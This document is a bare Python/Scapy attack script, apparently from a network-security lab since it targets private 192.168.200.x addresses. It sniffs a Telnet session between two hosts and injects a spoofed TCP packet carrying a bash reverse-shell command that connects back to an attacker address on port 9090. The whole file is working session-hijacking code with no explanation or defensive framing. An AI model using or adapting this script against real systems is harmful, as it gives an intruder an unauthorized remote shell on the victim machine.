#!/usr/bin/env python3
from scapy.all import *

# Reverse shell payload (ensure spacing/newlines are correct for Telnet)
payload = "\r/bin/bash -i >& /dev/tcp/192.168.200.100/9090 0>&1\r\n"

# Interface and IPs
iface = "eth0"  # or whatever interface you're sniffing on
IP_A = "192.168.200.10"
IP_B = "192.168.200.11"
ATTACKER_MAC = get_if_hwaddr(iface)

def inject_shell(pkt):
    if pkt.haslayer(Ether) and pkt[Ether].src == ATTACKER_MAC:
        return  # Don't process our own packets

    if pkt.haslayer(IP) and pkt.haslayer(TCP):
        if pkt[IP].src == IP_A and pkt[IP].dst == IP_B and pkt[TCP].flags == "PA":
            print(f"[+] Intercepted Telnet packet from {IP_A} → {IP_B}")
            
            # Build reverse shell injection packet
            ip = IP(src=pkt[IP].src, dst=pkt[IP].dst)
            tcp = TCP(
                sport=pkt[TCP].sport,
                dport=pkt[TCP].dport,
                flags="PA",
                seq=pkt[TCP].seq,
                ack=pkt[TCP].ack
            )
            inj_pkt = ip / tcp / payload
            send(inj_pkt, verbose=0)
            print("[+] Injected reverse shell payload.")

sniff(
    iface=iface,
    filter=f"tcp port 23 and host {IP_A} and host {IP_B}",
    prn=inject_shell
)
